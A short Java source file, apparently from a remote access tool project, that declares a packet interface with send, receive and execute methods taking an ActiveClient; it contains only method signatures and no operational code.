package de.sogomn.rat.packet;

import de.sogomn.rat.ActiveClient;



public interface IPacket {
	
	void send(final ActiveClient client);
	
	void receive(final ActiveClient client);
	
	void execute(final ActiveClient client);
	
}
